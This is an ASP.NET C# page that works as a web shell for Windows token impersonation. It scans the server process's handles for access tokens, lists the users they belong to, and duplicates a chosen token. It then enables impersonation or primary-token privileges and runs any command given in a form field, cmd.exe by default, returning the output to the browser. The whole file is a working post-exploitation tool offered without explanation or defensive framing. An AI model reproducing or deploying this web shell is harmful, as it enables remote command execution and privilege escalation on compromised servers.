<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Collections" %>
<%@ Import Namespace="System.Text.RegularExpressions" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Page Language="c#"%>

<script runat="server">

	public const int NO_ERROR = 0;
	public const int ERROR_INSUFFICIENT_BUFFER = 122;
	public const int HANDLE_FLAG_INHERIT = 0x00000001;
	public const int SE_PRIVILEGE_ENABLED = 0x00000002;
	public const int TOKEN_QUERY = 0x00000008;
	public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
	public const string IMPERSONATE = "SeImpersonatePrivilege";
	public const string ASSIGN_PRIMARY_TOKEN = "SeAssignPrimaryTokenPrivilege";
	public const string INCREASE_QUOTA = "SeIncreaseQuotaPrivilege";
	public const long SECURITY_MANDATORY_HIGH_RID =(0x00003000L);

	public enum SID_NAME_USE
	{
	    SidTypeUser = 1,
	    SidTypeGroup,
	    SidTypeDomain,
	    SidTypeAlias,
	    SidTypeWellKnownGroup,
	    SidTypeDeletedAccount,
	    SidTypeInvalid,
	    SidTypeUnknown,
	    SidTypeComputer
	}

	public enum TOKEN_INFORMATION_CLASS
	{
	    TokenUser = 1,
	    TokenGroups,
	    TokenPrivileges,
	    TokenOwner,
	    TokenPrimaryGroup,
	    TokenDefaultDacl,
	    TokenSource,
	    TokenType,
	    TokenImpersonationLevel,
	    TokenStatistics,
	    TokenRestrictedSids,
	    TokenSessionId,
	    TokenGroupsAndPrivileges,
	    TokenSessionReference,
	    TokenSandBoxInert,
	    TokenAuditPolicy,
	    TokenOrigin,
	    TokenElevationType,
	    TokenLinkedToken,
	    TokenElevation,
	    TokenHasRestrictions,
	    TokenAccessInformation,
	    TokenVirtualizationAllowed,
	    TokenVirtualizationEnabled,
	    TokenIntegrityLevel,
	    TokenUIAccess,
	    TokenMandatoryPolicy,
	    TokenLogonSid,
	    MaxTokenInfoClass
	}

	public struct TOKEN_USER
	{
	    public SID_AND_ATTRIBUTES User;
	}

	public struct TOKEN_ORIGIN
	{
	    public ulong tokenorigin;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct TOKEN_MANDATORY_LABEL
	{
	    public SID_AND_ATTRIBUTES Label;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct SID_AND_ATTRIBUTES
	{
	    public IntPtr Sid;
	    public int Attributes;
	}

	public enum OBJECT_INFORMATION_CLASS : int
	{
	    ObjectBasicInformation = 0,
	    ObjectNameInformation = 1,
	    ObjectTypeInformation = 2,
	    ObjectAllTypesInformation = 3,
	    ObjectHandleInformation = 4
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct OBJECT_TYPE_INFORMATION
	{ // Information Class 1
	    public UNICODE_STRING Name;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct UNICODE_STRING
	{
	    public ushort Length;
	    public ushort MaximumLength;
	    public IntPtr Buffer;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_INFORMATION
	{
	   public IntPtr hProcess;
	   public IntPtr hThread;
	   public int dwProcessId;
	   public int dwThreadId;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct STARTUPINFO
	{
	     public Int32 cb;
	     public string lpReserved;
	     public string lpDesktop;
	     public string lpTitle;
	     public Int32 dwX;
	     public Int32 dwY;
	     public Int32 dwXSize;
	     public Int32 dwYSize;
	     public Int32 dwXCountChars;
	     public Int32 dwYCountChars;
	     public Int32 dwFillAttribute;
	     public Int32 dwFlags;
	     public Int16 wShowWindow;
	     public Int16 cbReserved2;
	     public IntPtr lpReserved2;
	     public IntPtr hStdInput;
	     public IntPtr hStdOutput;
	     public IntPtr hStdError;
	}

	public enum LogonFlags
	{
	     WithProfile = 1,
	     NetCredentialsOnly
	}

	public enum CreationFlags
	{
	    NoConsole = 0x08000000
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct SECURITY_ATTRIBUTES
	{
	    public int nLength;
	    public IntPtr lpSecurityDescriptor;
	    public int bInheritHandle;
	}

	public enum TOKEN_TYPE
	{
	    TokenPrimary = 1,
	    TokenImpersonation
	}

	public enum SECURITY_IMPERSONATION_LEVEL
	{
	    SecurityAnonymous,
	    SecurityIdentification,
	    SecurityImpersonation,
	    SecurityDelegation
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct TokPriv1Luid
	{
	    public int Count;
	    public long Luid;
	    public int Attr;
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool GetTokenInformation(
	    IntPtr TokenHandle,
	    TOKEN_INFORMATION_CLASS TokenInformationClass,
	    IntPtr TokenInformation,
	    int TokenInformationLength,
	    out int ReturnLength);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public extern static bool DuplicateTokenEx(
	    IntPtr hExistingToken,
	    uint dwDesiredAccess,
	    ref SECURITY_ATTRIBUTES lpTokenAttributes,
	    SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
	    TOKEN_TYPE TokenType,
	    out IntPtr phNewToken);

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern IntPtr GetSidSubAuthority(IntPtr pSid, int nSubAuthority);

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr CreatePipe(ref IntPtr hReadPipe, ref IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes,Int32 nSize);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped/*IntPtr.Zero*/);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool SetHandleInformation(IntPtr hObject, int dwMask, int dwFlags);

	[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
	public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

	[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
	public static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool LookupPrivilegeValue(string host, string name,ref long pluid);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetCurrentProcess();

	[DllImport("ntdll.dll")]
	public static extern int NtQueryObject(IntPtr ObjectHandle, int ObjectInformationClass, IntPtr ObjectInformation, int ObjectInformationLength, ref int returnLength);

	[DllImport("kernel32.dll")]
	public static extern bool CloseHandle(IntPtr hObject);

	[DllImport("kernel32.dll")]
	public static extern bool GetHandleInformation(IntPtr hObject, out uint lpdwFlags);

	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern int NtQueryInformationProcess(IntPtr processHandle, uint processInformationClass, IntPtr processInformation, int processInformationLength, ref int returnLength);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool LookupAccountSid(
	    [MarshalAs(UnmanagedType.LPTStr)] string strSystemName,
	    IntPtr pSid,
	    System.Text.StringBuilder pName,
	    ref uint cchName,
	    System.Text.StringBuilder pReferencedDomainName,
	    ref uint cchReferencedDomainName,
	    out SID_NAME_USE peUse);
		
	[DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
	public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

	[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
	public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, string lpApplicationName, string lpCommandLine, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
	
	protected void RunThings (object sender, EventArgs e)
	{
		string id = Request.Form["DropdownList"];
		string file = Request.Form["file"];
		string args = Request.Form["args"];
		IntPtr token = new IntPtr(Int32.Parse(id));

		if (token == IntPtr.Zero)
		{
			Response.Write("Token not found");
			return;
		}

		uint dwTokenRights = 395U;
		IntPtr hPrimaryToken = IntPtr.Zero;
		SECURITY_ATTRIBUTES securityAttr = new SECURITY_ATTRIBUTES();
		STARTUPINFO si = new STARTUPINFO();
		PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
		SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
		saAttr.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
		saAttr.bInheritHandle = 0x1;
		saAttr.lpSecurityDescriptor = IntPtr.Zero;

		IntPtr out_read = IntPtr.Zero;
		IntPtr out_write = IntPtr.Zero;
		IntPtr err_read = IntPtr.Zero;
		IntPtr err_write = IntPtr.Zero;

		CreatePipe(ref out_read, ref out_write, ref saAttr, 0);
		CreatePipe(ref err_read, ref err_write, ref saAttr, 0);
		SetHandleInformation(out_read, HANDLE_FLAG_INHERIT, 0);
		SetHandleInformation(err_read, HANDLE_FLAG_INHERIT, 0);

		si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
		si.hStdOutput = out_write;
		si.hStdError = err_write;
		si.dwFlags |= 0x00000100;

		if (!DuplicateTokenEx(token, dwTokenRights, ref securityAttr, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out hPrimaryToken))
		{
			Response.Write("Call to DuplicateTokenEx failed.");
			return;
		}

		if (!CreateAsUser(hPrimaryToken, file, String.Concat(" ", args), IntPtr.Zero, IntPtr.Zero, true, CreationFlags.NoConsole, IntPtr.Zero, Path.GetDirectoryName(file), si, pi))
		{	      
			if (!CreateWithToken(hPrimaryToken, 0, file, String.Concat(" ", args), CreationFlags.NoConsole, IntPtr.Zero, Path.GetDirectoryName(file), si, pi))
			{		
				Response.Write("Error: " + Marshal.GetLastWin32Error());
				CloseHandle(hPrimaryToken);
				return;
			}
		}

		CloseHandle(out_write);
		CloseHandle(err_write);

		byte[] buf = new byte[4096];
		int dwRead = 0;
		string final = "";
		while (true)
		{
			bool bSuccess = ReadFile(out_read, buf, 4096, ref dwRead, IntPtr.Zero);
			if (!bSuccess || dwRead == 0)
				break;
			final += System.Text.Encoding.Default.GetString(buf);
			buf = new byte[4096];
		}

		ResponseArea.InnerText = Regex.Replace(final,  @"[^\P{C}\n]+", "", RegexOptions.None);;

		CloseHandle(out_read);
		CloseHandle(err_read);
		CloseHandle(hPrimaryToken);
	}

	public bool CreateAsUser(IntPtr hPrimaryToken, string file, string args, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, STARTUPINFO si, PROCESS_INFORMATION pi)
	{
		bool retVal;
		IntPtr htok = IntPtr.Zero;
		retVal = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);

		TokPriv1Luid tp;
		tp.Count = 1;
		tp.Luid = 0;
		tp.Attr = SE_PRIVILEGE_ENABLED;
		if(!LookupPrivilegeValue(null, ASSIGN_PRIMARY_TOKEN, ref tp.Luid))
		{
			Response.Write("SeAssignPrimaryTokenPrivilege not found.");
			CloseHandle(htok);
			return false;
		}

		if(!AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
		{
			Response.Write("SeAssignPrimaryTokenPrivilege could not be enabled.");
			CloseHandle(htok);
			return false;
		}

		TokPriv1Luid tp2;
		tp2.Count = 1;
		tp2.Luid = 0;
		tp2.Attr = SE_PRIVILEGE_ENABLED;
		if(LookupPrivilegeValue(null, INCREASE_QUOTA, ref tp2.Luid))
		{
			AdjustTokenPrivileges(htok, false, ref tp2, 0, IntPtr.Zero, IntPtr.Zero);
		}

		CloseHandle(htok);

		return CreateProcessAsUser(hPrimaryToken, file, String.Concat(" ", args), IntPtr.Zero, IntPtr.Zero, true, CreationFlags.NoConsole, IntPtr.Zero, Path.GetDirectoryName(file), ref si, out pi);
	}

	public bool CreateWithToken(IntPtr hPrimaryToken, LogonFlags dwLogonFlags, string file, string args, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, STARTUPINFO si, PROCESS_INFORMATION pi)
	{   
		bool retVal;
		IntPtr htok = IntPtr.Zero;
		retVal = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);

		TokPriv1Luid tp;
		tp.Count = 1;
		tp.Luid = 0;
		tp.Attr = SE_PRIVILEGE_ENABLED;
		LookupPrivilegeValue(null, IMPERSONATE, ref tp.Luid);
		AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);

		CloseHandle(htok);

		return CreateProcessWithTokenW(hPrimaryToken, 0, file, String.Concat(" ", args), CreationFlags.NoConsole, IntPtr.Zero, Path.GetDirectoryName(file), ref si, out pi);
	}

	protected void Refresh (object sender, EventArgs e)
	{
		DropDownList.Items.Clear();
		List<string> users = new List<string>();
		GetAllUsernames(users); 
	}

	public void GetAllUsernames(List<string> users)
	{
	    int nLength = 0, status = 0;

	    try
	    {
	        for (int index = 1; index < 1000000; index++)
	        {
	            IntPtr handle = new IntPtr(index);
	            IntPtr hObjectName = IntPtr.Zero;
	            try
	            {
	                nLength = 0;
	                hObjectName = Marshal.AllocHGlobal(256 * 1024);
	                status = NtQueryObject(handle, (int)OBJECT_INFORMATION_CLASS.ObjectTypeInformation, hObjectName, nLength, ref nLength);

	                if (string.Format("{0:X}", status) == "C0000008") // STATUS_INVALID_HANDLE
	                    continue;
	                
	                while (status != 0)
	                {
	                    Marshal.FreeHGlobal(hObjectName);
	                    if (nLength == 0)
	                        continue;

	                    hObjectName = Marshal.AllocHGlobal(nLength);
	                    status = NtQueryObject(handle, (int)OBJECT_INFORMATION_CLASS.ObjectTypeInformation, hObjectName, nLength, ref nLength);
	                }

					OBJECT_TYPE_INFORMATION objObjectName = (OBJECT_TYPE_INFORMATION)Marshal.PtrToStructure(hObjectName, typeof(OBJECT_TYPE_INFORMATION));

	                if (objObjectName.Name.Buffer != IntPtr.Zero)
	                {
	                    string strObjectName = "" + Marshal.PtrToStringUni(objObjectName.Name.Buffer);

	                    if (strObjectName.ToLower() == "token")
	                    {
	                        int tokenInfLen = 0;
	                        bool result;

	                        // first call gets length of TokenInformation
	                        result = GetTokenInformation(handle, TOKEN_INFORMATION_CLASS.TokenUser, IntPtr.Zero, tokenInfLen, out tokenInfLen);
	                        IntPtr TokenInformation = Marshal.AllocHGlobal(tokenInfLen);
	                        result = GetTokenInformation(handle, TOKEN_INFORMATION_CLASS.TokenUser, TokenInformation, tokenInfLen, out tokenInfLen);

	                        if (result)
	                        {

	                            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));

	                            IntPtr pstr = IntPtr.Zero;
	                            StringBuilder name = new StringBuilder();
	                            uint cchName = (uint)name.Capacity;
	                            StringBuilder referencedDomainName = new StringBuilder();
	                            uint cchReferencedDomainName = (uint)referencedDomainName.Capacity;
	                            SID_NAME_USE sidUse;

	                            int err = NO_ERROR;
	                            if (!LookupAccountSid(null, TokenUser.User.Sid, name, ref cchName, referencedDomainName, ref cchReferencedDomainName, out sidUse))
	                            {
	                                err = Marshal.GetLastWin32Error();
	                                if (err == ERROR_INSUFFICIENT_BUFFER)
	                                {
	                                    name.EnsureCapacity((int)cchName);
	                                    referencedDomainName.EnsureCapacity((int)cchReferencedDomainName);
	                                    err = NO_ERROR;
	                                    if (!LookupAccountSid(null, TokenUser.User.Sid, name, ref cchName, referencedDomainName, ref cchReferencedDomainName, out sidUse))
	                                        err = Marshal.GetLastWin32Error();
	                                }
	                            }

	                            if (err == NO_ERROR)
	                            {
	                                string userName = referencedDomainName.ToString().ToLower() + "\\" + name.ToString().ToLower();
	                                IntPtr tokenInformation = Marshal.AllocHGlobal(8);

	                                result = GetTokenInformation(handle, TOKEN_INFORMATION_CLASS.TokenOrigin, tokenInformation, 8, out tokenInfLen);
	                                if (result)
	                                {
	                                    TOKEN_ORIGIN tokenOrigin = (TOKEN_ORIGIN)Marshal.PtrToStructure(tokenInformation, typeof(TOKEN_ORIGIN));
	                                    if (tokenOrigin.tokenorigin != 0)
	                                            userName += "*";
	                                }

	                                // From https://www.pinvoke.net/default.aspx/Constants/SECURITY_MANDATORY.html
	                                IntPtr pb = Marshal.AllocCoTaskMem(1000);
	                                try 
	                                {
	                                    int cb = 1000;
	                                    if (GetTokenInformation(handle, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pb, cb, out cb)) 
	                                    {
	                                        IntPtr pSid = Marshal.ReadIntPtr(pb);

	                                        int dwIntegrityLevel = Marshal.ReadInt32(GetSidSubAuthority(pSid, (int)(Marshal.ReadByte(GetSidSubAuthorityCount(pSid)) - 1U)));

	                                        if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) 
	                                            userName += " (+)";
	                                    }
	                                }
	                                finally 
	                                {
	                                    Marshal.FreeCoTaskMem(pb);
	                                }

	                                if (!users.Contains(userName))
	                                {
	                                    SetHandleInformation(
	                                        handle,
	                                        0x00000002, // HANDLE_FLAG_PROTECT_FROM_CLOSE
	                                        0x00000002
	                                        );

	                                    DropDownList.Items.Insert(0, new ListItem(userName, handle.ToInt32().ToString()));
	                                    users.Add(userName);
	                                }
	                            }
	                        }

	                        Marshal.FreeHGlobal(TokenInformation);
	                    }
	                }
	            }
	            catch (Exception) { }
	            finally
	            {
	                Marshal.FreeHGlobal(hObjectName);
	            }
	            
	        }
	    }
	    catch (Exception) { }   

	    return;         
	}
        
</script>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252" />
<title>Test</title>
</head>
<body>
    <form id="form1" runat="server">  
        <div class="div" align="center">  
        <br/><br/>  
            <asp:DropDownList ID="DropDownList" name="dropdown" runat="server" width="250px" >  
            </asp:DropDownList>
            <input type="text" name="file" style='width:23em' value="c:\windows\system32\cmd.exe" />
            <asp:Button ID="run" runat="server" style='width:6em' Text="Run" onClick="RunThings" /> 
            <asp:Button ID="refresh" runat="server" Text="Get Tokens" onClick="Refresh"/> 
            <br> 
            <input type="text" name="args" style='width:55em' value="/C whoami"  />
        </div>  
    </form> 

<style>
    div.justified {
        display: flex;
        justify-content: center;
    }
</style>

    <div class="justified">
        <textarea id="ResponseArea" runat="server" rows="10" cols="100" style="width: 733px; height: 173px;"></textarea>
    </div>
    <br/>
    <div class ="justified">
        * Network Access.
        </br>(+) High integrity level.
    </div>

</body>
</html>
 
 
